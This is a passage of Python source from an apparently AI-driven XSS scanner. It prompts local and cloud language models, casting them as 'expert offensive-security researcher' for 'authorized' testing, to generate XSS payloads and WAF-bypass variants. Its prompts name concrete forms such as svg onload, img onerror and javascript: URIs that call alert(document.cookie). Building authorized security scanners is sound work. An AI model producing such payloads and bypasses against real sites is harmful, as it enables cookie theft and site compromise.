        "You are a triage gate for an XSS scanner. Given a reflection context, score its XSS potential "
        "1-10 and decide if cloud API spend is justified. "
        "Reply only with valid JSON: score (int 1-10), should_escalate (bool), reason (one sentence), "
        "context_notes (one sentence of hints for payload generation, or empty string)."
    )
    user = json.dumps(prompt_data)

    try:
        response = requests.post(
            f"{OLLAMA_BASE_URL}/api/generate",
            json={"model": resolved_model, "prompt": f"{system}\n\n{user}", "stream": False},
            timeout=max(1, request_timeout_seconds),
        )
        response.raise_for_status()
        raw = response.json().get("response", "")
        data = _extract_json_blob(raw)
        if not isinstance(data, dict):
            raise ValueError("non-dict response")
        return {
            "score": max(1, min(10, int(data.get("score", 5)))),
            "should_escalate": bool(data.get("should_escalate", True)),
            "reason": str(data.get("reason", "")),
            "context_notes": str(data.get("context_notes", "")),
        }
    except Exception as exc:
        log.debug("Local triage error: %s — defaulting to escalate", exc)
        return {
            "score": 5,
            "should_escalate": True,
            "reason": f"Triage parse error: {exc}",
            "context_notes": "",
        }


# ---------------------------------------------------------------------------
# OpenAI-compatible generation (OpenAI + OpenRouter share the same function)
# ---------------------------------------------------------------------------

def _generate_with_openai_compat(
    context: ParsedContext,
    base_url: str,
    api_key: str,
    model: str,
    source_label: str,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    request_timeout_seconds: int = 120,
    phase: str = "research",
    strategy_hint: str | None = None,
) -> list[PayloadCandidate]:
    prompt = _prompt_for_generation_phase(
        context,
        phase=phase,
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }
    # OpenRouter requires these for rate-limit attribution
    if "openrouter" in base_url:
        headers["HTTP-Referer"] = "https://github.com/axss"
        headers["X-Title"] = "axss"

    response = requests.post(
        f"{base_url}/chat/completions",
        headers=headers,
        json={
            "model": model,
            "response_format": {"type": "json_object"},
            "messages": [
                {
                    "role": "system",
                    "content": (
                        "You are an expert offensive-security researcher. "
                        "Return strict JSON for authorized XSS testing payload generation."
                    ),
                },
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.35,
        },
        timeout=max(1, request_timeout_seconds),
    )
    response.raise_for_status()
    body = response.json()
    content = body["choices"][0]["message"]["content"]
    data = _extract_json_blob(content)
    return _normalize_payloads(data.get("payloads", []), source=source_label)


def _generate_with_openrouter(
    context: ParsedContext,
    cloud_model: str,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    request_timeout_seconds: int = 120,
    phase: str = "research",
    strategy_hint: str | None = None,
) -> list[PayloadCandidate]:
    from ai_xss_generator.config import load_api_key
    api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if not api_key:
        raise RuntimeError("OPENROUTER_API_KEY not set")
    return _generate_with_openai_compat(
        context,
        base_url=OPENROUTER_BASE_URL,
        api_key=api_key,
        model=cloud_model,
        source_label="openrouter",
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        request_timeout_seconds=request_timeout_seconds,
        phase=phase,
        strategy_hint=strategy_hint,
    )


def _generate_with_openai(
    context: ParsedContext,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    request_timeout_seconds: int = 120,
    phase: str = "research",
    strategy_hint: str | None = None,
) -> list[PayloadCandidate]:
    from ai_xss_generator.config import load_api_key
    api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if not api_key:
        raise RuntimeError("OPENAI_API_KEY not set")
    return _generate_with_openai_compat(
        context,
        base_url=OPENAI_BASE_URL,
        api_key=api_key,
        model=OPENAI_FALLBACK_MODEL,
        source_label="openai",
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        request_timeout_seconds=request_timeout_seconds,
        phase=phase,
        strategy_hint=strategy_hint,
    )


# ---------------------------------------------------------------------------
# Lightweight strategy analysis
# ---------------------------------------------------------------------------

def _strategy_hint_schema() -> dict[str, Any]:
    return {
        "type": "object",
        "properties": {
            "strategy_hint": {"type": "string"},
        },
        "required": ["strategy_hint"],
        "additionalProperties": False,
    }


def _strategy_hint_prompt(
    *,
    generated_count: int,
    reflected_count: int,
    surviving_chars: str,
    waf: str | None,
    context_type: str,
) -> str:
    return (
        "You are triaging failed payload execution for an authorized XSS assessment.\n"
        "Return ONLY strict JSON with {\"strategy_hint\": \"...\"}.\n\n"
        "Fast attempts exhausted. Results:\n"
        f"- {generated_count} payloads generated, {reflected_count} reflected, 0 executed\n"
        f"- Surviving chars: {surviving_chars or '(none observed)'}\n"
        f"- WAF: {waf or 'none'}\n"
        f"- Reflection context: {context_type or 'unknown'}\n"
        "Why might payloads reflect but not execute? Pick ONE strategy for deeper analysis.\n"
        "Keep strategy_hint to one short sentence naming one concrete pivot."
    )


def analyze_deep_strategy_hint(
    *,
    context: ParsedContext,
    cloud_model: str,
    generated_count: int,
    reflected_count: int,
    waf: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    phase_profile: str = "normal",
) -> str:
    from ai_xss_generator.ai_capabilities import (
        GENERATION_ROLE,
        recommended_api_timeout_seconds_for_phase,
        recommended_timeout_seconds_for_phase,
    )
    from ai_xss_generator.cli_runner import generate_via_cli_with_tool
    from ai_xss_generator.config import load_api_key

    _, context_type, surviving_chars = _extract_probe_context(context)
    dom_runtime = _extract_dom_runtime_context(context)
    if dom_runtime:
        context_type = dom_runtime.get("sink", "") or context_type
    prompt = _strategy_hint_prompt(
        generated_count=generated_count,
        reflected_count=reflected_count,
        surviving_chars=surviving_chars,
        waf=waf,
        context_type=context_type,
    )
    schema = _strategy_hint_schema()

    if ai_backend == "cli":
        timeout_seconds = recommended_timeout_seconds_for_phase(
            cli_tool,
            GENERATION_ROLE,
            "scout",
            30,
            profile=phase_profile,
        )
        try:
            raw, _ = generate_via_cli_with_tool(
                cli_tool,
                prompt,
                cli_model,
                timeout_seconds=timeout_seconds,
                schema=schema,
            )
            data = _extract_json_blob(raw)
            return str(data.get("strategy_hint", "") or "").strip()
        except Exception:
            return ""

    api_timeout_seconds = recommended_api_timeout_seconds_for_phase(
        cloud_model,
        GENERATION_ROLE,
        "scout",
        45,
        profile=phase_profile,
    )
    headers = {"Content-Type": "application/json"}

    openrouter_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if openrouter_key:
        try:
            response = requests.post(
                f"{OPENROUTER_BASE_URL}/chat/completions",
                headers={
                    **headers,
                    "Authorization": f"Bearer {openrouter_key}",
                    "HTTP-Referer": "https://github.com/axss",
                    "X-Title": "axss",
                },
                json={
                    "model": cloud_model,
                    "response_format": {"type": "json_object"},
                    "messages": [
                        {
                            "role": "system",
                            "content": "Return strict JSON for authorized XSS strategy triage.",
                        },
                        {"role": "user", "content": prompt},
                    ],
                    "temperature": 0.2,
                },
                timeout=max(1, api_timeout_seconds),
            )
            response.raise_for_status()
            content = response.json()["choices"][0]["message"]["content"]
            data = _extract_json_blob(content)
            return str(data.get("strategy_hint", "") or "").strip()
        except Exception:
            pass

    openai_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if openai_key:
        try:
            response = requests.post(
                f"{OPENAI_BASE_URL}/chat/completions",
                headers={
                    **headers,
                    "Authorization": f"Bearer {openai_key}",
                },
                json={
                    "model": OPENAI_FALLBACK_MODEL,
                    "response_format": {"type": "json_object"},
                    "messages": [
                        {
                            "role": "system",
                            "content": "Return strict JSON for authorized XSS strategy triage.",
                        },
                        {"role": "user", "content": prompt},
                    ],
                    "temperature": 0.2,
                },
                timeout=max(1, api_timeout_seconds),
            )
            response.raise_for_status()
            content = response.json()["choices"][0]["message"]["content"]
            data = _extract_json_blob(content)
            return str(data.get("strategy_hint", "") or "").strip()
        except Exception:
            pass

    return ""


# ---------------------------------------------------------------------------
# Cloud escalation — try OpenRouter then OpenAI
# ---------------------------------------------------------------------------

def _generate_with_cli(
    context: ParsedContext,
    tool: str,
    cli_model: str | None,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    phase_profile: str = "normal",
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
    strategy_hint: str | None = None,
) -> tuple[list[PayloadCandidate], str]:
    """Generate payloads by calling the CLI backend, with cross-tool failover."""
    from ai_xss_generator.cli_runner import _trace_preview, generate_via_cli_with_tool
    from ai_xss_generator.ai_capabilities import GENERATION_ROLE, recommended_timeout_seconds_for_phase

    last_error: Exception | None = None
    last_tool = tool
    for phase in _resolve_generation_phases(deep=deep, phases=phases):
        prompt = _prompt_for_generation_phase(
            context,
            phase=phase,
            reference_payloads=reference_payloads,
            waf=waf,
            past_findings=past_findings,
            past_lessons=past_lessons,
            strategy_hint=strategy_hint,
        )
        timeout_seconds = recommended_timeout_seconds_for_phase(
            tool,
            GENERATION_ROLE,
            phase,
            60,
            profile=phase_profile,
        )
        schema = _generation_output_schema(phase)
        try:
            raw, actual_tool = generate_via_cli_with_tool(
                tool,
                prompt,
                cli_model,
                timeout_seconds=timeout_seconds,
                schema=schema,
            )
            last_tool = actual_tool
            log.debug("CLI backend resolved to %s for %s (%s phase)", actual_tool, context.source, phase)
            data = _extract_json_blob(raw)
            payloads = _normalize_payloads(data.get("payloads", []), source=f"cli:{actual_tool}")
            if not _is_weak_output(payloads) or phase == "research":
                return payloads, actual_tool
        except Exception as exc:
            last_error = exc
            raw_preview = ""
            if isinstance(exc, Exception):
                raw_preview = ""
            log.debug(
                "CLI backend (%s) failed for %s during %s phase: %s%s",
                last_tool,
                context.source,
                phase,
                exc,
                f"\nRaw preview:\n{_trace_preview(raw_preview)}" if raw_preview else "",
            )
            continue
    if last_error is not None:
        raise last_error
    return [], last_tool


def _try_cloud(
    context: ParsedContext,
    cloud_model: str,
    reference_payloads: list[Any] | None,
    waf: str | None,
    past_findings: list[Finding] | None,
    past_lessons: list[Any] | None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    phase_profile: str = "normal",
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
    strategy_hint: str | None = None,
) -> tuple[list[PayloadCandidate], str]:
    """Attempt cloud generation. Returns (payloads, engine_label).

    When ai_backend="cli": invokes the claude or codex CLI subprocess.
    When ai_backend="api": tries OpenRouter then OpenAI (original behaviour).
    Returns ([], "") if the chosen backend is unavailable or fails.
    """
    kwargs: dict[str, Any] = dict(
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
    )

    # ── CLI backend ──────────────────────────────────────────────────────────
    if ai_backend == "cli":
        try:
            payloads, actual_tool = _generate_with_cli(
                context,
                cli_tool,
                cli_model,
                phase_profile=phase_profile,
                deep=deep,
                phases=phases,
                strategy_hint=strategy_hint,
                **kwargs,
            )
            return payloads, f"cli:{actual_tool}"
        except Exception as exc:
            log.debug("CLI backend (%s) failed: %s", cli_tool, exc)
            return [], ""

    # ── API backend (original behaviour) ────────────────────────────────────
    from ai_xss_generator.config import load_api_key
    from ai_xss_generator.ai_capabilities import GENERATION_ROLE, recommended_api_timeout_seconds_for_phase
    for phase in _resolve_generation_phases(deep=deep, phases=phases):
        api_timeout_seconds = recommended_api_timeout_seconds_for_phase(
            cloud_model,
            GENERATION_ROLE,
            phase,
            120,
            profile=phase_profile,
        )
        if os.environ.get("OPENROUTER_API_KEY") or load_api_key("openrouter_api_key"):
            try:
                payloads = _generate_with_openrouter(
                    context,
                    cloud_model,
                    request_timeout_seconds=api_timeout_seconds,
                    phase=phase,
                    strategy_hint=strategy_hint,
                    **kwargs,
                )
                if not _is_weak_output(payloads) or phase == "research":
                    return payloads, "openrouter"
            except Exception:
                pass

        if os.environ.get("OPENAI_API_KEY") or load_api_key("openai_api_key"):
            try:
                payloads = _generate_with_openai(
                    context,
                    request_timeout_seconds=api_timeout_seconds,
                    phase=phase,
                    strategy_hint=strategy_hint,
                    **kwargs,
                )
                if not _is_weak_output(payloads) or phase == "research":
                    return payloads, "openai"
            except Exception:
                pass

    return [], ""


# ---------------------------------------------------------------------------
# Findings persistence for cloud-generated payloads
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Key validation
# ---------------------------------------------------------------------------

def check_api_keys() -> list[dict[str, str]]:
    """Probe each configured service and return a list of status dicts.

    Each dict has keys: service, source, status, detail.
      status: "ok" | "invalid" | "missing" | "error" | "unreachable"
      source: where the key was found ("env", "keys file", "not set", or a URL)

    Checks (in order):
      1. Ollama — GET /api/tags on the configured host
      2. OpenRouter — GET /api/v1/auth/key (returns credit/tier info)
      3. OpenAI — GET /v1/models (list endpoint; validates key without cost)
    """
    from ai_xss_generator.config import load_api_key

    results: list[dict[str, str]] = []

    # ── 1. Ollama ─────────────────────────────────────────────────────────────
    try:
        resp = requests.get(f"{OLLAMA_BASE_URL}/api/tags", timeout=5)
        if resp.status_code == 200:
            models = [m.get("name", "") for m in resp.json().get("models", [])]
            model_preview = ", ".join(models[:4]) + (" …" if len(models) > 4 else "")
            detail = f"{len(models)} model(s) loaded" + (f": {model_preview}" if models else "")
            results.append({"service": "Ollama", "source": OLLAMA_BASE_URL, "status": "ok", "detail": detail})
        else:
            results.append({"service": "Ollama", "source": OLLAMA_BASE_URL, "status": "error", "detail": f"HTTP {resp.status_code}"})
    except Exception as exc:
        results.append({"service": "Ollama", "source": OLLAMA_BASE_URL, "status": "unreachable", "detail": str(exc)})

    # ── 2. OpenRouter ─────────────────────────────────────────────────────────
    or_env = os.environ.get("OPENROUTER_API_KEY", "")
    or_file = load_api_key("openrouter_api_key")
    or_key = or_env or or_file
    or_source = "env" if or_env else ("keys file" if or_file else "not set")

    if or_key:
        try:
            resp = requests.get(
                f"{OPENROUTER_BASE_URL}/auth/key",
                headers={"Authorization": f"Bearer {or_key}"},
                timeout=8,
            )
            if resp.status_code == 200:
                data = resp.json().get("data", {})
                usage = data.get("usage", 0)
                limit = data.get("limit")
                is_free = data.get("is_free_tier", False)
                tier = "free tier" if is_free else (
                    f"${usage:.4f} used" + (f" / ${limit:.2f} limit" if limit else "")
                )
                results.append({"service": "OpenRouter", "source": or_source, "status": "ok", "detail": tier})
            elif resp.status_code == 401:
                results.append({"service": "OpenRouter", "source": or_source, "status": "invalid", "detail": "key rejected (401 Unauthorized)"})
            else:
                results.append({"service": "OpenRouter", "source": or_source, "status": "error", "detail": f"HTTP {resp.status_code}"})
        except Exception as exc:
            results.append({"service": "OpenRouter", "source": or_source, "status": "error", "detail": str(exc)})
    else:
        results.append({
            "service": "OpenRouter",
            "source": "not set",
            "status": "missing",
            "detail": "add openrouter_api_key = sk-or-... to ~/.axss/keys",
        })

    # ── 3. OpenAI ─────────────────────────────────────────────────────────────
    oa_env = os.environ.get("OPENAI_API_KEY", "")
    oa_file = load_api_key("openai_api_key")
    oa_key = oa_env or oa_file
    oa_source = "env" if oa_env else ("keys file" if oa_file else "not set")

    if oa_key:
        try:
            resp = requests.get(
                f"{OPENAI_BASE_URL}/models",
                headers={"Authorization": f"Bearer {oa_key}"},
                timeout=8,
            )
            if resp.status_code == 200:
                count = len(resp.json().get("data", []))
                results.append({"service": "OpenAI", "source": oa_source, "status": "ok", "detail": f"{count} model(s) accessible"})
            elif resp.status_code == 401:
                results.append({"service": "OpenAI", "source": oa_source, "status": "invalid", "detail": "key rejected (401 Unauthorized)"})
            else:
                results.append({"service": "OpenAI", "source": oa_source, "status": "error", "detail": f"HTTP {resp.status_code}"})
        except Exception as exc:
            results.append({"service": "OpenAI", "source": oa_source, "status": "error", "detail": str(exc)})
    else:
        results.append({
            "service": "OpenAI",
            "source": "not set",
            "status": "missing",
            "detail": "add openai_api_key = sk-... to ~/.axss/keys or set OPENAI_API_KEY",
        })

    # ── 4. Claude CLI ─────────────────────────────────────────────────────────
    from ai_xss_generator.cli_runner import check_cli_tool
    results.append(check_cli_tool("claude"))

    # ── 5. Codex CLI ──────────────────────────────────────────────────────────
    results.append(check_cli_tool("codex"))

    return results


# ---------------------------------------------------------------------------
# Public cloud escalation — used by the active scanner worker
# ---------------------------------------------------------------------------

def generate_cloud_payloads(
    context: "ParsedContext",
    cloud_model: str,
    waf: str | None = None,
    reference_payloads: list[Any] | None = None,
    past_findings: "list[Finding] | None" = None,
    past_lessons: "list[Any] | None" = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    memory_profile: dict[str, Any] | None = None,
    phase_profile: str = "normal",
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
    strategy_hint: str | None = None,
    # Legacy params — accepted but ignored
    allowed_memory_tiers: "Any" = None,
    allowed_lesson_tiers: "Any" = None,
) -> "tuple[list[PayloadCandidate], str]":
    """Call the cloud model directly for active-scanner escalation.

    Skips local Ollama entirely — only used when Phase 1 mechanical transforms
    AND local model payloads have already failed to confirm execution.

    Returns (payloads, engine_label).  Returns ([], "") when no API key is set
    or the cloud call fails.
    """
    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
    memory_profile = memory_profile or build_memory_profile(
        context=context,
        waf_name=waf,
    )
    if past_findings is None:
        past_findings = relevant_findings(
            sink_type=sink_type,
            context_type=context_type,
            surviving_chars=surviving_chars,
            waf_name=str(memory_profile.get("waf_name", "")),
            delivery_mode=str(memory_profile.get("delivery_mode", "")),
            frameworks=tuple(memory_profile.get("frameworks", [])),
            auth_required=bool(memory_profile.get("auth_required", False)),
        )

    # Fast omni mode: augment strategy_hint with broad-spectrum instructions so
    # the model covers all injection contexts without probe context to guide it.
    if phase_profile == "fast_omni":
        _fast_omni_note = (
            "FAST OMNI MODE: No probe was run on this target. Generate a broad-spectrum payload set "
            "covering ALL common injection contexts:\n"
            "- HTML body: <script>, <img onerror>, <svg onload>, <details ontoggle>\n"
            "- HTML attributes (href, src, action, formaction): javascript: URI payloads — "
            '<a href="javascript:alert(document.cookie)">, '
            '<button formaction="javascript:alert(document.cookie)">\n'
            "- Attribute event handlers: onload, onerror, onfocus (quoted and unquoted)\n"
            "- JS string breakout: single quote, double quote, template literal contexts\n"
            "- Filter bypass patterns: HTML entities, case variation, unusual whitespace, "
            "mXSS (mutation XSS) patterns\n"
            "- Navigation sinks: location.href, location.assign, window.open\n"
            "Include at least 2 payloads per context class. Payloads must target alert(document.cookie)."
        )
        strategy_hint = (
            _fast_omni_note if not strategy_hint
            else f"{_fast_omni_note}\n\nAdditional context: {strategy_hint}"
        )

    payloads, engine = _try_cloud(
        context=context,
        cloud_model=cloud_model,
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        ai_backend=ai_backend,
        cli_tool=cli_tool,
        cli_model=cli_model,
        phase_profile=phase_profile,
        deep=deep,
        phases=phases,
        strategy_hint=strategy_hint,
    )

    return payloads, engine


def generate_dom_local_payloads(
    context: ParsedContext,
    model: str,
    waf: str | None = None,
    reference_payloads: list[Any] | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    memory_profile: dict[str, Any] | None = None,
    local_timeout_seconds: int = 60,
) -> tuple[list[PayloadCandidate], str]:
    """Generate a compact DOM-specific local payload set for active scans."""
    dom_runtime = _extract_dom_runtime_context(context)
    sink_type = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
    memory_profile = memory_profile or build_memory_profile(
        context=context,
        waf_name=waf,
        delivery_mode="dom",
    )
    if past_findings is None:
        past_findings = relevant_findings(
            sink_type=sink_type,
            context_type="dom_xss",
            surviving_chars="",
            waf_name=str(memory_profile.get("waf_name", "")),
            delivery_mode=str(memory_profile.get("delivery_mode", "")),
            frameworks=tuple(memory_profile.get("frameworks", [])),
            auth_required=bool(memory_profile.get("auth_required", False)),
        )

    return _generate_dom_local_with_ollama(
        context=context,
        model=model,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        request_timeout_seconds=local_timeout_seconds,
        reference_payloads=reference_payloads,
    )


# ---------------------------------------------------------------------------
# Mutators
# ---------------------------------------------------------------------------

def _apply_mutators(
    payloads: list[PayloadCandidate],
    context: ParsedContext,
    mutator_plugins: list[Any],
) -> list[PayloadCandidate]:
    mutated = list(payloads)
    for plugin in mutator_plugins:
        try:
            produced = plugin.mutate(payloads, context)
        except Exception:
            continue
        for item in produced or []:
            mutated.append(item)
    return mutated


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def generate_payloads(
    context: ParsedContext,
    model: str,
    mutator_plugins: list[Any] | None = None,
    progress: Any | None = None,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    use_cloud: bool = True,
    cloud_model: str = "anthropic/claude-3-5-sonnet",
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    past_lessons: list[Any] | None = None,
    memory_profile: dict[str, Any] | None = None,
    local_timeout_seconds: int = 120,
    deep: bool = False,
    # Legacy params — accepted but ignored
    allowed_memory_tiers: Any = None,
    allowed_lesson_tiers: Any = None,
) -> tuple[list[PayloadCandidate], str, bool, str]:
    """Generate, rank, and return payloads for *context*.

    Escalation chain:
      1. Local Ollama (with curated findings and probe lessons injected into prompt)
      2. If local output is weak AND use_cloud=True AND an API key exists:
         → OpenRouter (preferred) or OpenAI
      3. Fall through to heuristic-only if everything above fails

    past_lessons — ephemeral probe observations from this scan session.
                   Built by worker.py from probe results; discarded after the scan.

    Returns (payloads, engine, used_fallback, resolved_model).
    """
    mutator_plugins = mutator_plugins or []
    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)

    if progress is not None:
        progress("Loading relevant curated findings...")

    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    memory_profile = memory_profile or build_memory_profile(
        context=context,
        waf_name=waf,
    )
    past_findings = relevant_findings(
        sink_type=sink_type,
        context_type=context_type,
        surviving_chars=surviving_chars,
        waf_name=str(memory_profile.get("waf_name", "")),
        delivery_mode=str(memory_profile.get("delivery_mode", "")),
        frameworks=tuple(memory_profile.get("frameworks", [])),
        auth_required=bool(memory_profile.get("auth_required", False)),
    )

    if progress is not None:
        hint = f"{len(past_findings)} curated finding(s) found" if past_findings else "no curated findings for this context"
        lesson_hint = f"{len(past_lessons)} probe observation(s)" if past_lessons else "no probe observations"
        progress(f"Knowledge base: {hint}; {lesson_hint}.")
        progress("Generating payloads...")

    heuristics = base_payloads_for_context(context)
    engine = "heuristic"
    used_fallback = True
    resolved_model = model
    ai_payloads: list[PayloadCandidate] = []

    # ── Step 1: Local Ollama ──────────────────────────────────────────────────
    try:
        ai_payloads, resolved_model = _generate_with_ollama(
            context,
            model,
            reference_payloads=reference_payloads,
            waf=waf,
            past_findings=past_findings,
            past_lessons=past_lessons,
            request_timeout_seconds=local_timeout_seconds,
        )
        engine = "ollama"
        used_fallback = False
    except Exception:
        pass

    # ── Step 2: Cloud escalation (only when local is weak and cloud allowed) ──
    cloud_used = False
    if _is_weak_output(ai_payloads) and use_cloud:
        if progress is not None:
            progress("Local model output weak — attempting cloud escalation...")

        cloud_payloads, cloud_engine = _try_cloud(
            context,
            cloud_model=cloud_model,
            reference_payloads=reference_payloads,
            waf=waf,
            past_findings=past_findings,
            past_lessons=past_lessons,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            deep=deep,
        )

        if cloud_payloads:
            if progress is not None:
                progress(f"Cloud ({cloud_engine}) returned {len(cloud_payloads)} payloads.")
            ai_payloads = cloud_payloads
            engine = cloud_engine
            resolved_model = cloud_model
            used_fallback = True
            cloud_used = True
        elif progress is not None:
            progress("No cloud API keys configured — running heuristic-only.")

    # ── Combine + rank ────────────────────────────────────────────────────────
    combined = heuristics + ai_payloads

    if progress is not None:
        progress("Ranking/mutating...")

    combined = _apply_mutators(combined, context, mutator_plugins)
    ranked = rank_payloads(combined, context)

    if engine != "heuristic":
        ranked = [
            replace(payload, risk_score=max(payload.risk_score, 1))
            if payload.source in {"ollama", "openai", "openrouter"}
            else payload
            for payload in ranked
        ]
        ranked = sorted(ranked, key=lambda item: (-item.risk_score, item.payload))

    return ranked, engine, used_fallback, resolved_model


# ---------------------------------------------------------------------------
# Fast-batch generation — one upfront call, application-agnostic
# ---------------------------------------------------------------------------

_FAST_BATCH_PROMPT = """\
You are generating a high-quality XSS payload set for authorized penetration testing.
This is application-agnostic: generate payloads purely from XSS theory — no knowledge of \
the specific target is needed.

Generate exactly {count} payloads. Prioritise quality and edge-case coverage over quantity.
Every payload must be distinct and purposeful — no filler, no near-duplicates.
Cover each context class and bypass family with the single best representative payload for that class.
One payload should do one thing exceptionally well.

CONTEXT CLASSES (tag each payload with one primary context tag):
  context:html_body        — injected directly into HTML document body
  context:html_attr_event  — injected into an HTML attribute (onX handlers, onerror, onload)
  context:html_attr_url    — injected into href, src, action, formaction (javascript: URI payloads)
  context:js_string_single — injected inside a JS single-quoted string
  context:js_string_double — injected inside a JS double-quoted string
  context:js_template      — injected inside a JS template literal (`...`)
  context:url_fragment     — injected into URL hash/query (DOM-sink targets: location, document.URL)

ENCODING / BYPASS FAMILIES to cover (add a bypass tag for each):
  bypass:raw              — no encoding
  bypass:html_entity      — &#x3c;script&#x3e; style
  bypass:js_escape        — \\x3c, \\u003c style
  bypass:double_encode    — %2522, &#x26;#x3c; style
  bypass:case_variation   — ScRiPt, IMG, sVg etc.
  bypass:null_byte        — null byte / truncation tricks
  bypass:comment_break    — /**/ or <!--> interruption
  bypass:backtick         — backtick as quote substitute
  bypass:polyglot         — works in 2+ contexts simultaneously
  bypass:mxss             — mutation XSS (browser parser diff tricks)
  bypass:waf_generic      — generic WAF evasion patterns{waf_block}

PAYLOAD REQUIREMENTS:
- Each payload MUST call alert(document.cookie) or alert(document.domain) on execution
- Cover at least 2 payloads per context class
- Cover at least 2 payloads per bypass family
- Payloads should be syntactically complete (ready to inject as-is)
- Prefer payload variety over repetition

Return a JSON object with this exact structure:
{{
  "payloads": [
    {{
      "payload": "<the raw XSS payload string>",
      "title": "short human-readable name",
      "tags": ["context:html_body", "bypass:raw"],
      "target_sink": "innerHTML / eval / href / etc.",
      "bypass_family": "raw",
      "risk_score": 7,
      "explanation": "one sentence on why this works"
    }}
  ]
}}
"""

_WAF_BYPASS_ADDENDUM = """
  bypass:waf_{waf}        — known bypass patterns specific to {waf}
"""


def generate_fast_batch(
    cloud_model: str,
    waf: str | None = None,
    count: int = 50,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 180,
) -> list[PayloadCandidate]:
    """Generate a high-quality application-agnostic payload batch in a single LLM call.

    Used by fast mode to produce the batch upfront before workers start,
    replacing per-URL/per-parameter cloud calls entirely.

    Args:
        cloud_model:   Cloud model identifier (OpenRouter / OpenAI format).
        waf:           Known/detected WAF name — adds WAF-specific bypass instructions.
        count:         Number of payloads to request (default 50).
        ai_backend:    Accepted for interface compatibility; batch always uses API path.
        cli_tool:      Accepted for interface compatibility; unused in batch path.
        cli_model:     Accepted for interface compatibility; unused in batch path.
        request_timeout_seconds: HTTP timeout for the LLM call.

    Returns:
        List of PayloadCandidate objects tagged with context and bypass families.
        Falls back to an empty list on error (scan continues with heuristic payloads).
    """
    from ai_xss_generator.config import load_api_key

    waf_block = (
        _WAF_BYPASS_ADDENDUM.format(waf=waf.lower().replace(" ", "_"))
        if waf else ""
    )
    prompt = _FAST_BATCH_PROMPT.format(count=count, waf_block=waf_block)

    system_msg = (
        "You are an expert offensive-security researcher specialising in XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON object."
    )

    def _call_api(base_url: str, api_key: str, model: str, source: str) -> list[PayloadCandidate]:
        headers: dict[str, str] = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }
        if "openrouter" in base_url:
            headers["HTTP-Referer"] = "https://github.com/axss"
            headers["X-Title"] = "axss"
        import requests as _req
        resp = _req.post(
            f"{base_url}/chat/completions",
            headers=headers,
            json={
                "model": model,
                "response_format": {"type": "json_object"},
                "messages": [
                    {"role": "system", "content": system_msg},
                    {"role": "user",   "content": prompt},
                ],
                "temperature": 0.7,  # higher temp = more payload variety
            },
            timeout=max(1, request_timeout_seconds),
        )
        resp.raise_for_status()
        content = resp.json()["choices"][0]["message"]["content"]
        data = _extract_json_blob(content)
        return _normalize_payloads(data.get("payloads", []), source=source)

    backend_label = f"{cli_tool}:{cli_model or 'default'}" if ai_backend == "cli" else cloud_model
    log.info("Generating fast batch (%d payloads) via %s …", count, backend_label)

    # CLI backend — send the raw batch prompt directly to the configured CLI tool
    if ai_backend == "cli":
        try:
            from ai_xss_generator.cli_runner import generate_via_cli_with_tool
            raw, used_tool = generate_via_cli_with_tool(
                cli_tool,
                prompt,
                model=cli_model or None,
                timeout_seconds=request_timeout_seconds,
            )
            data = _extract_json_blob(raw)
            payloads = _normalize_payloads(data.get("payloads", []), source=used_tool)
            log.info("Fast batch: %d payloads from CLI backend (%s)", len(payloads), used_tool)
            return payloads
        except Exception as exc:
            log.warning("CLI batch generation failed, falling back to API: %s", exc)

    # Try OpenRouter first, then OpenAI
    api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if api_key:
        try:
            payloads = _call_api(OPENROUTER_BASE_URL, api_key, cloud_model, "openrouter")
            log.info("Fast batch: %d payloads from OpenRouter", len(payloads))
            return payloads
        except Exception as exc:
